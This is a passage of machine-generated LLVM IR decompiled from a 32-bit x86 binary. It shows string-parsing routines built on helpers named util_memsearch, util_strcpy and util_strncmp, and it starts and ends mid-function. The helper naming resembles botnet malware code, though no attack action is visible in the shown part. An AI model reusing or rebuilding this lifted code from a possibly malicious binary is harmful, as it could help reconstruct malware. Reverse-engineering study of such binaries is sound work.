  %v2_8049b50 = add i32 %v0_8049b4d, 8
  %v3_8049b50 = inttoptr i32 %v2_8049b50 to i32*
  store i32 %v3_8049b48, i32* %v3_8049b50, align 4
  %v1_8049b51 = add i32 %v0_8049b4d, 124
  %v2_8049b51 = inttoptr i32 %v1_8049b51 to i32*
  %v3_8049b51 = load i32, i32* %v2_8049b51, align 4
  store i32 %v3_8049b51, i32* %eax.global-to-local, align 4
  %v2_8049b55 = add i32 %v0_8049b4d, 4
  %v3_8049b55 = inttoptr i32 %v2_8049b55 to i32*
  store i32 %v3_8049b51, i32* %v3_8049b55, align 4
  %v0_8049b56 = load i32, i32* @ebx, align 4
  %v3_8049b56 = inttoptr i32 %v0_8049b4d to i32*
  store i32 %v0_8049b56, i32* %v3_8049b56, align 4
  %v4_8049b57 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b57, i32* %eax.global-to-local, align 4
  %v1_8049b5c = load i32, i32* @esi, align 4
  %v2_8049b5c = add i32 %v1_8049b5c, %v4_8049b57
  store i32 %v2_8049b5c, i32* @ecx, align 4
  %v1_8049b5f = load i32, i32* @esp, align 4
  %v2_8049b5f = add i32 %v1_8049b5f, 132
  %v3_8049b5f = inttoptr i32 %v2_8049b5f to i32*
  store i32 %v2_8049b5c, i32* %v3_8049b5f, align 4
  %v0_8049b66 = load i32, i32* @esp, align 4
  %v1_8049b66 = add i32 %v0_8049b66, 16
  %v6_8049b66 = icmp eq i32 %v1_8049b66, 0
  store i1 %v6_8049b66, i1* %zf.global-to-local, align 1
  %v1_8049b69 = load i32, i32* @ecx, align 4
  %v2_8049b69 = add i32 %v0_8049b66, 147
  %v3_8049b69 = add i32 %v2_8049b69, %v1_8049b69
  %v4_8049b69 = inttoptr i32 %v3_8049b69 to i8*
  %v5_8049b69 = load i8, i8* %v4_8049b69, align 1
  %v11_8049b69 = icmp eq i8 %v5_8049b69, 32
  store i1 %v11_8049b69, i1* %zf.global-to-local, align 1
  br i1 %v11_8049b69, label %dec_label_pc_8049ccc, label %dec_label_pc_8049b77

dec_label_pc_8049b77:                             ; preds = %dec_label_pc_8049b42, %dec_label_pc_8049ccc
  %v1_8049b7f = phi i32 [ %v1_8049b66, %dec_label_pc_8049b42 ], [ %v0_8049b77.pre, %dec_label_pc_8049ccc ]
  %v1_8049b77 = add i32 %v1_8049b7f, 108
  %v2_8049b77 = inttoptr i32 %v1_8049b77 to i32*
  %v3_8049b77 = load i32, i32* %v2_8049b77, align 4
  %v0_8049b7b = load i32, i32* @ebx, align 4
  %v1_8049b7b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b7b = add i32 %v1_8049b7b, %v0_8049b7b
  %v1_8049b7d = load i32, i32* @esi, align 4
  %v2_8049b7d = sub i32 %v3_8049b77, %v1_8049b7d
  store i32 %v2_8049b7d, i32* %ebp.global-to-local, align 4
  %v2_8049b7f = add i32 %v1_8049b7f, 60
  %v3_8049b7f = inttoptr i32 %v2_8049b7f to i32*
  store i32 %v2_8049b7b, i32* %v3_8049b7f, align 4
  %v0_8049b83 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8049b83 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b83 = sub i32 %v0_8049b83, %v1_8049b83
  %v12_8049b83 = icmp eq i32 %v2_8049b83, 0
  store i1 %v12_8049b83, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b83, i32* @ebp, align 4
  %v0_8049b85 = load i32, i32* @esp, align 4
  %v1_8049b85 = add i32 %v0_8049b85, -4
  %v2_8049b85 = inttoptr i32 %v1_8049b85 to i32*
  store i32 2, i32* %v2_8049b85, align 4
  %v1_8049b87 = add i32 %v0_8049b85, -8
  %v2_8049b87 = inttoptr i32 %v1_8049b87 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_8049b87, align 4
  %v0_8049b8c = load i32, i32* @ebp, align 4
  %v2_8049b8c = add i32 %v0_8049b85, -12
  %v3_8049b8c = inttoptr i32 %v2_8049b8c to i32*
  store i32 %v0_8049b8c, i32* %v3_8049b8c, align 4
  %v1_8049b8d = add i32 %v0_8049b85, 60
  %v2_8049b8d = inttoptr i32 %v1_8049b8d to i32*
  %v3_8049b8d = load i32, i32* %v2_8049b8d, align 4
  store i32 %v3_8049b8d, i32* %eax.global-to-local, align 4
  %v2_8049b91 = add i32 %v0_8049b85, -16
  %v3_8049b91 = inttoptr i32 %v2_8049b91 to i32*
  store i32 %v3_8049b8d, i32* %v3_8049b91, align 4
  %v4_8049b92 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b92, i32* %eax.global-to-local, align 4
  %v0_8049b97 = load i32, i32* @esp, align 4
  %v1_8049b97 = add i32 %v0_8049b97, 16
  store i32 %v4_8049b92, i32* @ebx, align 4
  %v10_8049b9c = icmp eq i32 %v4_8049b92, -1
  store i1 %v10_8049b9c, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b9c, label %dec_label_pc_8049c3d, label %dec_label_pc_8049ba5

dec_label_pc_8049ba5:                             ; preds = %dec_label_pc_8049b77
  %v1_8049ba5 = add i32 %v0_8049b97, 147
  store i32 %v1_8049ba5, i32* %esi.global-to-local, align 4
  %v1_8049bac = add i32 %v0_8049b97, 132
  %v2_8049bac = inttoptr i32 %v1_8049bac to i32*
  %v3_8049bac = load i32, i32* %v2_8049bac, align 4
  store i32 %v3_8049bac, i32* %eax.global-to-local, align 4
  %v2_8049bb0 = add i32 %v3_8049bac, %v1_8049ba5
  store i32 %v2_8049bb0, i32* @esi, align 4
  %v10_8049bb2 = icmp eq i32 %v4_8049b92, 1
  store i1 %v10_8049bb2, i1* %zf.global-to-local, align 1
  %v7_8049bb5 = icmp sgt i32 %v4_8049b92, 1
  br i1 %v7_8049bb5, label %dec_label_pc_8049bb7, label %dec_label_pc_8049bba

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049ba5
  %v1_8049bb7 = add i32 %v4_8049b92, -2
  %v9_8049bb7 = icmp eq i32 %v1_8049bb7, 0
  store i1 %v9_8049bb7, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bb7, i32* @ebx, align 4
  br label %dec_label_pc_8049bba

dec_label_pc_8049bba:                             ; preds = %dec_label_pc_8049ba5, %dec_label_pc_8049bb7
  %v1_8049bba = add i32 %v0_8049b97, 12
  %v2_8049bba = inttoptr i32 %v1_8049bba to i32*
  store i32 1, i32* %v2_8049bba, align 4
  %v1_8049bbc = add i32 %v0_8049b97, 8
  %v2_8049bbc = inttoptr i32 %v1_8049bbc to i32*
  store i32 ptrtoint (i32* @global_var_8055869.20 to i32), i32* %v2_8049bbc, align 4
  %v0_8049bc1 = load i32, i32* @ebp, align 4
  %v2_8049bc1 = add i32 %v0_8049b97, 4
  %v3_8049bc1 = inttoptr i32 %v2_8049bc1 to i32*
  store i32 %v0_8049bc1, i32* %v3_8049bc1, align 4
  %v1_8049bc2 = add i32 %v0_8049b97, 76
  %v2_8049bc2 = inttoptr i32 %v1_8049bc2 to i32*
  %v3_8049bc2 = load i32, i32* %v2_8049bc2, align 4
  store i32 %v3_8049bc2, i32* %eax.global-to-local, align 4
  %v3_8049bc6 = inttoptr i32 %v0_8049b97 to i32*
  store i32 %v3_8049bc2, i32* %v3_8049bc6, align 4
  %v4_8049bc7 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049bc7, i32* %eax.global-to-local, align 4
  %v0_8049bcc = load i32, i32* @esp, align 4
  %v1_8049bcc = add i32 %v0_8049bcc, 16
  %v1_8049bcf = icmp eq i32 %v4_8049bc7, 0
  store i1 %v1_8049bcf, i1* %zf.global-to-local, align 1
  %tmp127 = icmp slt i32 %v4_8049bc7, 1
  br i1 %tmp127, label %dec_label_pc_8049beb, label %dec_label_pc_8049bd3

dec_label_pc_8049bd3:                             ; preds = %dec_label_pc_8049bba
  %v1_8049bd3 = add i32 %v0_8049bcc, 12
  %v2_8049bd3 = inttoptr i32 %v1_8049bd3 to i32*
  store i32 1, i32* %v2_8049bd3, align 4
  %v1_8049bd5 = add i32 %v0_8049bcc, 8
  %v2_8049bd5 = inttoptr i32 %v1_8049bd5 to i32*
  store i32 ptrtoint (i32* @global_var_8055869.20 to i32), i32* %v2_8049bd5, align 4
  %v0_8049bda = load i32, i32* @ebp, align 4
  %v2_8049bda = add i32 %v0_8049bcc, 4
  %v3_8049bda = inttoptr i32 %v2_8049bda to i32*
  store i32 %v0_8049bda, i32* %v3_8049bda, align 4
  %v1_8049bdb = add i32 %v0_8049bcc, 76
  %v2_8049bdb = inttoptr i32 %v1_8049bdb to i32*
  %v3_8049bdb = load i32, i32* %v2_8049bdb, align 4
  store i32 %v3_8049bdb, i32* @ecx, align 4
  %v3_8049bdf = inttoptr i32 %v0_8049bcc to i32*
  store i32 %v3_8049bdb, i32* %v3_8049bdf, align 4
  %v4_8049be0 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049be0, i32* %eax.global-to-local, align 4
  %v0_8049be5 = load i32, i32* @esp, align 4
  %v1_8049be5 = add i32 %v0_8049be5, 16
  %v6_8049be5 = icmp eq i32 %v1_8049be5, 0
  store i1 %v6_8049be5, i1* %zf.global-to-local, align 1
  %v1_8049be8 = add i32 %v4_8049be0, -1
  store i32 %v1_8049be8, i32* @ebx, align 4
  br label %dec_label_pc_8049beb

dec_label_pc_8049beb:                             ; preds = %dec_label_pc_8049bba, %dec_label_pc_8049bd3
  %v0_8049bf8 = phi i32 [ %v1_8049bcc, %dec_label_pc_8049bba ], [ %v1_8049be5, %dec_label_pc_8049bd3 ]
  %v1_8049beb = add i32 %v0_8049bf8, 116
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  %v3_8049beb = load i32, i32* %v2_8049beb, align 4
  store i32 %v3_8049beb, i32* %edx.global-to-local, align 4
  %v1_8049bef = add i32 %v0_8049bf8, 20904
  %v2_8049bf6 = add i32 %v1_8049bef, %v3_8049beb
  %v12_8049bf6 = icmp eq i32 %v2_8049bf6, 0
  store i1 %v12_8049bf6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049bf6, i32* %eax.global-to-local, align 4
  %v1_8049bf8 = add i32 %v0_8049bf8, 20900
  %v2_8049bf8 = inttoptr i32 %v1_8049bf8 to i32*
  store i32 0, i32* %v2_8049bf8, align 4
  %v0_8049c03 = load i32, i32* @ebx, align 4
  %v1_8049c03 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c03 = add i32 %v0_8049c03, -20773
  %v3_8049c03 = add i32 %v2_8049c03, %v1_8049c03
  %v4_8049c03 = inttoptr i32 %v3_8049c03 to i8*
  store i8 0, i8* %v4_8049c03, align 1
  br label %dec_label_pc_8049c20

dec_label_pc_8049c10:                             ; preds = %dec_label_pc_8049c20
  br i1 %v13_8049c10, label %dec_label_pc_8049c46, label %dec_label_pc_8049c16

dec_label_pc_8049c16:                             ; preds = %dec_label_pc_8049c10
  %v1_8049c16 = add i32 %v3_8049c29, 1
  store i32 %v1_8049c16, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c16, i32* %v2_8049c29, align 4
  br label %dec_label_pc_8049c20

dec_label_pc_8049c20:                             ; preds = %dec_label_pc_8049beb, %dec_label_pc_8049c16
  %v0_8049c20 = load i32, i32* @esp, align 4
  %v9_8049c20 = icmp eq i32 %v0_8049c20, 12
  store i1 %v9_8049c20, i1* %zf.global-to-local, align 1
  %v0_8049c23 = load i32, i32* @esi, align 4
  %v2_8049c23 = add i32 %v0_8049c20, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v2_8049c24 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 20916
  %v2_8049c29 = inttoptr i32 %v1_8049c29 to i32*
  %v3_8049c29 = load i32, i32* %v2_8049c29, align 4
  store i32 %v3_8049c29, i32* @ebx, align 4
  %v2_8049c33 = sub i32 %v2_8049c24, %v3_8049c29
  %v8_8049c33 = xor i32 %v3_8049c29, %v2_8049c24
  %v9_8049c33 = xor i32 %v2_8049c33, %v2_8049c24
  %v10_8049c33 = and i32 %v9_8049c33, %v8_8049c33
  %v11_8049c33 = icmp slt i32 %v10_8049c33, 0
  %v12_8049c33 = icmp eq i32 %v2_8049c33, 0
  store i1 %v12_8049c33, i1* %zf.global-to-local, align 1
  %v13_8049c33 = icmp slt i32 %v2_8049c33, 0
  %v3_8049c35 = icmp eq i1 %v13_8049c33, %v11_8049c33
  %v4_8049c35 = icmp eq i1 %v12_8049c33, false
  %v5_8049c35 = and i1 %v4_8049c35, %v3_8049c35
  %v0_8049c10 = load i32, i32* @esi, align 4
  %v2_8049c10 = add i32 %v0_8049c10, %v3_8049c29
  %v3_8049c10 = inttoptr i32 %v2_8049c10 to i8*
  %v4_8049c10 = load i8, i8* %v3_8049c10, align 1
  %v13_8049c10 = icmp eq i8 %v4_8049c10, 61
  store i1 %v13_8049c10, i1* %zf.global-to-local, align 1
  br i1 %v5_8049c35, label %dec_label_pc_8049c10, label %dec_label_pc_8049c37

dec_label_pc_8049c37:                             ; preds = %dec_label_pc_8049c20
  %v1_8049c30 = add i32 %v0_8049c29, 16
  br i1 %v13_8049c10, label %dec_label_pc_8049c46, label %dec_label_pc_8049c3d

dec_label_pc_8049c3d:                             ; preds = %dec_label_pc_8049c60, %dec_label_pc_8049c92, %dec_label_pc_8049c37, %dec_label_pc_8049b77, %dec_label_pc_8049ca3
  %v0_8049c3d = phi i32 [ %v1_8049c9b, %dec_label_pc_8049c92 ], [ %v1_8049c30, %dec_label_pc_8049c37 ], [ %v1_8049b97, %dec_label_pc_8049b77 ], [ %v0_8049c3d.pre, %dec_label_pc_8049ca3 ], [ %v1_8049c77, %dec_label_pc_8049c60 ]
  %v1_8049c3d = add i32 %v0_8049c3d, 116
  %v2_8049c3d = inttoptr i32 %v1_8049c3d to i32*
  %v3_8049c3d = load i32, i32* %v2_8049c3d, align 4
  br label %dec_label_pc_8049b0b

dec_label_pc_8049c46:                             ; preds = %dec_label_pc_8049c10, %dec_label_pc_8049c37
  store i32 0, i32* %v2_8049c29, align 4
  %v0_8049c51 = load i32, i32* @edi, align 4
  %v1_8049c51 = add i32 %v0_8049c51, 16
  %v2_8049c51 = inttoptr i32 %v1_8049c51 to i32*
  %v3_8049c51 = load i32, i32* %v2_8049c51, align 4
  store i32 %v3_8049c51, i32* %eax.global-to-local, align 4
  %v1_8049c54 = icmp eq i32 %v3_8049c51, 0
  store i1 %v1_8049c54, i1* %zf.global-to-local, align 1
  %tmp128 = icmp slt i32 %v3_8049c51, 1
  br i1 %tmp128, label %dec_label_pc_8049c92, label %dec_label_pc_8049c58

dec_label_pc_8049c58:                             ; preds = %dec_label_pc_8049c46
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049c60

dec_label_pc_8049c60:                             ; preds = %dec_label_pc_8049c7e, %dec_label_pc_8049c58
  %v0_8049c60 = phi i32 [ %v4_8049c8d, %dec_label_pc_8049c7e ], [ 0, %dec_label_pc_8049c58 ]
  %v2_8049c60 = mul i32 %v0_8049c60, 128
  %v3_8049c60 = icmp eq i32 %v2_8049c60, 0
  store i1 %v3_8049c60, i1* %zf.global-to-local, align 1
  store i32 %v2_8049c60, i32* %eax.global-to-local, align 4
  %v0_8049c63 = load i32, i32* @ebp, align 4
  %v1_8049c63 = load i32, i32* @esp, align 4
  %v2_8049c63 = add i32 %v1_8049c63, -4
  %v3_8049c63 = inttoptr i32 %v2_8049c63 to i32*
  store i32 %v0_8049c63, i32* %v3_8049c63, align 4
  %v0_8049c64 = load i32, i32* @ebx, align 4
  %v2_8049c64 = add i32 %v1_8049c63, -8
  %v3_8049c64 = inttoptr i32 %v2_8049c64 to i32*
  store i32 %v0_8049c64, i32* %v3_8049c64, align 4
  %v1_8049c65 = add i32 %v1_8049c63, 96
  %v2_8049c65 = inttoptr i32 %v1_8049c65 to i32*
  %v3_8049c65 = load i32, i32* %v2_8049c65, align 4
  store i32 %v3_8049c65, i32* %ecx.global-to-local, align 4
  %v1_8049c69 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c69 = add i32 %v3_8049c65, 1472
  %v3_8049c69 = add i32 %v2_8049c69, %v1_8049c69
  store i32 %v3_8049c69, i32* %eax.global-to-local, align 4
  %v2_8049c70 = add i32 %v1_8049c63, -12
  %v3_8049c70 = inttoptr i32 %v2_8049c70 to i32*
  store i32 %v3_8049c69, i32* %v3_8049c70, align 4
  %v0_8049c71 = load i32, i32* @esi, align 4
  %v2_8049c71 = add i32 %v1_8049c63, -16
  %v3_8049c71 = inttoptr i32 %v2_8049c71 to i32*
  store i32 %v0_8049c71, i32* %v3_8049c71, align 4
  %v0_8049c72 = call i32 @util_strncmp()
  store i32 %v0_8049c72, i32* %eax.global-to-local, align 4
  %v0_8049c77 = load i32, i32* @esp, align 4
  %v1_8049c77 = add i32 %v0_8049c77, 16
  %v3_8049c7a = trunc i32 %v0_8049c72 to i8
  %v4_8049c7a = icmp eq i8 %v3_8049c7a, 0
  store i1 %v4_8049c7a, i1* %zf.global-to-local, align 1
  %v1_8049c7c = icmp eq i1 %v4_8049c7a, false
  br i1 %v1_8049c7c, label %dec_label_pc_8049c3d, label %dec_label_pc_8049c7e

dec_label_pc_8049c7e:                             ; preds = %dec_label_pc_8049c60
  %v1_8049c7e = add i32 %v0_8049c77, 20916
  %v2_8049c7e = inttoptr i32 %v1_8049c7e to i32*
  %v3_8049c7e = load i32, i32* %v2_8049c7e, align 4
  %v1_8049c85 = add i32 %v3_8049c7e, 1
  store i32 %v1_8049c85, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c85, i32* %v2_8049c7e, align 4
  %v0_8049c8d = load i32, i32* @edi, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 16
  %v2_8049c8d = inttoptr i32 %v1_8049c8d to i32*
  %v3_8049c8d = load i32, i32* %v2_8049c8d, align 4
  %v4_8049c8d = load i32, i32* %eax.global-to-local, align 4
  %v5_8049c8d = sub i32 %v3_8049c8d, %v4_8049c8d
  %v11_8049c8d = xor i32 %v4_8049c8d, %v3_8049c8d
  %v12_8049c8d = xor i32 %v5_8049c8d, %v3_8049c8d
  %v13_8049c8d = and i32 %v12_8049c8d, %v11_8049c8d
  %v14_8049c8d = icmp slt i32 %v13_8049c8d, 0
  %v15_8049c8d = icmp eq i32 %v5_8049c8d, 0
  store i1 %v15_8049c8d, i1* %zf.global-to-local, align 1
  %v16_8049c8d = icmp slt i32 %v5_8049c8d, 0
  %v3_8049c90 = icmp eq i1 %v16_8049c8d, %v14_8049c8d
  %v4_8049c90 = icmp eq i1 %v15_8049c8d, false
  %v5_8049c90 = and i1 %v4_8049c90, %v3_8049c90
  br i1 %v5_8049c90, label %dec_label_pc_8049c60, label %dec_label_pc_8049c92

dec_label_pc_8049c92:                             ; preds = %dec_label_pc_8049c7e, %dec_label_pc_8049c46
  %v0_8049c92 = load i32, i32* @esp, align 4
  %v9_8049c92 = icmp eq i32 %v0_8049c92, 12
  store i1 %v9_8049c92, i1* %zf.global-to-local, align 1
  %v0_8049c95 = load i32, i32* @esi, align 4
  %v2_8049c95 = add i32 %v0_8049c92, -16
  %v3_8049c95 = inttoptr i32 %v2_8049c95 to i32*
  store i32 %v0_8049c95, i32* %v3_8049c95, align 4
  %v2_8049c96 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049c96, i32* %eax.global-to-local, align 4
  %v0_8049c9b = load i32, i32* @esp, align 4
  %v1_8049c9b = add i32 %v0_8049c9b, 16
  %v1_8049c9e = add i32 %v2_8049c96, -127
  %v6_8049c9e = sub i32 126, %v2_8049c96
  %v7_8049c9e = and i32 %v6_8049c9e, %v2_8049c96
  %v8_8049c9e = icmp slt i32 %v7_8049c9e, 0
  %v9_8049c9e = icmp eq i32 %v1_8049c9e, 0
  store i1 %v9_8049c9e, i1* %zf.global-to-local, align 1
  %v10_8049c9e = icmp slt i32 %v1_8049c9e, 0
  %v3_8049ca1 = icmp eq i1 %v10_8049c9e, %v8_8049c9e
  %v4_8049ca1 = icmp eq i1 %v9_8049c9e, false
  %v5_8049ca1 = and i1 %v4_8049ca1, %v3_8049ca1
  br i1 %v5_8049ca1, label %dec_label_pc_8049c3d, label %dec_label_pc_8049ca3

dec_label_pc_8049ca3:                             ; preds = %dec_label_pc_8049c92
  %v0_8049ca3 = load i32, i32* @ecx, align 4
  %v2_8049ca3 = add i32 %v0_8049c9b, 12
  %v3_8049ca3 = inttoptr i32 %v2_8049ca3 to i32*
  store i32 %v0_8049ca3, i32* %v3_8049ca3, align 4
  %v0_8049ca4 = load i32, i32* @ecx, align 4
  %v2_8049ca4 = add i32 %v0_8049c9b, 8
  %v3_8049ca4 = inttoptr i32 %v2_8049ca4 to i32*
  store i32 %v0_8049ca4, i32* %v3_8049ca4, align 4
  %v0_8049ca5 = load i32, i32* @esi, align 4
  %v2_8049ca5 = add i32 %v0_8049c9b, 4
  %v3_8049ca5 = inttoptr i32 %v2_8049ca5 to i32*
  store i32 %v0_8049ca5, i32* %v3_8049ca5, align 4
  %v0_8049ca6 = load i32, i32* @edi, align 4
  %v1_8049ca6 = add i32 %v0_8049ca6, 16
  %v2_8049ca6 = inttoptr i32 %v1_8049ca6 to i32*
  %v3_8049ca6 = load i32, i32* %v2_8049ca6, align 4
  store i32 %v3_8049ca6, i32* %eax.global-to-local, align 4
  %v1_8049ca9 = add i32 %v0_8049c9b, 112
  %v2_8049ca9 = inttoptr i32 %v1_8049ca9 to i32*
  %v3_8049ca9 = load i32, i32* %v2_8049ca9, align 4
  store i32 %v3_8049ca9, i32* %edx.global-to-local, align 4
  %v2_8049cad = mul i32 %v3_8049ca6, 128
  %v3_8049cad = icmp eq i32 %v2_8049cad, 0
  store i1 %v3_8049cad, i1* %zf.global-to-local, align 1
  %v2_8049cb0 = add i32 %v2_8049cad, 1472
  %v3_8049cb0 = add i32 %v2_8049cb0, %v3_8049ca9
  store i32 %v3_8049cb0, i32* @eax, align 4
  %v3_8049cb7 = inttoptr i32 %v0_8049c9b to i32*
  store i32 %v3_8049cb0, i32* %v3_8049cb7, align 4
  %v3_8049cb8 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049cb8, i32* %eax.global-to-local, align 4
  %v0_8049cbd = load i32, i32* @edi, align 4
  %v1_8049cbd = add i32 %v0_8049cbd, 16
  %v2_8049cbd = inttoptr i32 %v1_8049cbd to i32*
  %v3_8049cbd = load i32, i32* %v2_8049cbd, align 4
  %v1_8049cc3 = add i32 %v3_8049cbd, 1
  %v8_8049cc3 = icmp eq i32 %v1_8049cc3, 0
  store i1 %v8_8049cc3, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cc3, i32* %edx.global-to-local, align 4
  store i32 %v1_8049cc3, i32* %v2_8049cbd, align 4
  %v0_8049c3d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049c3d

dec_label_pc_8049ccc:                             ; preds = %dec_label_pc_8049b42
  %v0_8049ccc = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ccc = add i32 %v0_8049ccc, 1
  %v8_8049ccc = icmp eq i32 %v1_8049ccc, 0
  store i1 %v8_8049ccc, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccc, i32* %eax.global-to-local, align 4
  %v1_8049ccd = load i32, i32* @esi, align 4
  %v2_8049ccd = add i32 %v1_8049ccd, %v1_8049ccc
  store i32 %v2_8049ccd, i32* %edx.global-to-local, align 4
  %v2_8049cd0 = add i32 %v0_8049b66, 132
  %v3_8049cd0 = inttoptr i32 %v2_8049cd0 to i32*
  store i32 %v2_8049ccd, i32* %v3_8049cd0, align 4
  %v0_8049b77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049b77

dec_label_pc_8049cd9:                             ; preds = %dec_label_pc_804a284, %dec_label_pc_804a276
  %v0_8049cd9 = phi i32 [ %v0_804a269, %dec_label_pc_804a276 ], [ %v2_804a294, %dec_label_pc_804a284 ]
  %v1_8049cd9 = inttoptr i32 %v0_8049cd9 to i8*
  store i8 0, i8* %v1_8049cd9, align 1
  %v0_8049cdf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049cdc

dec_label_pc_8049cdc:                             ; preds = %dec_label_pc_804a28c, %dec_label_pc_804a249, %dec_label_pc_8049cd9
  %v0_8049cdf = phi i32 [ %v0_804a269, %dec_label_pc_804a249 ], [ %v0_8049cdf.pre, %dec_label_pc_8049cd9 ], [ %v0_804a294, %dec_label_pc_804a28c ]
  %v0_8049cdc = load i32, i32* @esp, align 4
  %v9_8049cdc = icmp eq i32 %v0_8049cdc, 12
  store i1 %v9_8049cdc, i1* %zf.global-to-local, align 1
  %v2_8049cdf = add i32 %v0_8049cdc, -16
  %v3_8049cdf = inttoptr i32 %v2_8049cdf to i32*
  store i32 %v0_8049cdf, i32* %v3_8049cdf, align 4
  %v2_8049ce0 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049ce0, i32* %eax.global-to-local, align 4
  %v0_8049ce5 = load i32, i32* @esp, align 4
  %v1_8049ce5 = add i32 %v0_8049ce5, 16
  %v1_8049ce8 = icmp eq i32 %v2_8049ce0, 0
  store i1 %v1_8049ce8, i1* %zf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v2_8049ce0, 1
  br i1 %tmp129, label %dec_label_pc_8049d01, label %dec_label_pc_8049cec

dec_label_pc_8049cec:                             ; preds = %dec_label_pc_8049cdc
  %v9_8049cec = icmp eq i32 %v0_8049ce5, -4
  store i1 %v9_8049cec, i1* %zf.global-to-local, align 1
  %v0_8049cef = load i32, i32* @esi, align 4
  %v3_8049cef = inttoptr i32 %v0_8049ce5 to i32*
  store i32 %v0_8049cef, i32* %v3_8049cef, align 4
  %v2_8049cf0 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049cf0, i32* %eax.global-to-local, align 4
  %v0_8049cf5 = load i32, i32* @esp, align 4
  %v1_8049cf5 = add i32 %v0_8049cf5, 16
  %v10_8049cf8 = icmp eq i32 %v2_8049cf0, 127
  store i1 %v10_8049cf8, i1* %zf.global-to-local, align 1
  %v7_8049cfb = icmp sgt i32 %v2_8049cf0, 127
  br i1 %v7_8049cfb, label %dec_label_pc_8049d01, label %dec_label_pc_804a510

dec_label_pc_8049d01:                             ; preds = %dec_label_pc_8049cec, %dec_label_pc_8049cdc, %dec_label_pc_804a510
  %v0_8049d01 = phi i32 [ %v1_8049cf5, %dec_label_pc_8049cec ], [ %v1_8049ce5, %dec_label_pc_8049cdc ], [ %v1_804a522, %dec_label_pc_804a510 ]
  %v0_8049d04 = load i32, i32* @esi, align 4
  %v1_8049d04 = add i32 %v0_8049d04, 1
  store i32 %v1_8049d04, i32* @ebx, align 4
  store i32 %v1_8049d04, i32* %eax.global-to-local, align 4
  %v1_8049d09 = add i32 %v0_8049d01, 20900
  %v2_8049d09 = inttoptr i32 %v1_8049d09 to i32*
  %v3_8049d09 = load i32, i32* %v2_8049d09, align 4
  store i32 %v3_8049d09, i32* %edx.global-to-local, align 4
  %v2_8049d10 = add i32 %v3_8049d09, %v1_8049d04
  %v12_8049d10 = icmp eq i32 %v2_8049d10, 0
  store i1 %v12_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d10, i32* %eax.global-to-local, align 4
  %v2_8049d12 = add i32 %v0_8049d01, -16
  %v3_8049d12 = inttoptr i32 %v2_8049d12 to i32*
  store i32 %v2_8049d10, i32* %v3_8049d12, align 4
  %v2_8049d13 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049d13, i32* @eax, align 4
  %v0_8049d18 = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v2_8049d13, -255
  %v6_8049d1b = sub i32 254, %v2_8049d13
  %v7_8049d1b = and i32 %v6_8049d1b, %v2_8049d13
  %v8_8049d1b = icmp slt i32 %v7_8049d1b, 0
  %v9_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v9_8049d1b, i1* %zf.global-to-local, align 1
  %v10_8049d1b = icmp slt i32 %v1_8049d1b, 0
  %v3_8049d20 = icmp eq i1 %v10_8049d1b, %v8_8049d1b
  %v4_8049d20 = icmp eq i1 %v9_8049d1b, false
  %v5_8049d20 = and i1 %v4_8049d20, %v3_8049d20
  br i1 %v5_8049d20, label %dec_label_pc_8049d67, label %dec_label_pc_8049d22

dec_label_pc_8049d22:                             ; preds = %dec_label_pc_8049d01
  %v1_8049d22 = add i32 %v0_8049d18, 112
  %v2_8049d22 = inttoptr i32 %v1_8049d22 to i32*
  %v3_8049d22 = load i32, i32* %v2_8049d22, align 4
  store i32 %v3_8049d22, i32* %esi.global-to-local, align 4
  %v0_8049d26 = load i32, i32* @ebp, align 4
  %v2_8049d26 = add i32 %v0_8049d18, 12
  %v3_8049d26 = inttoptr i32 %v2_8049d26 to i32*
  store i32 %v0_8049d26, i32* %v3_8049d26, align 4
  %v0_8049d27 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d27 = add i32 %v0_8049d27, 533
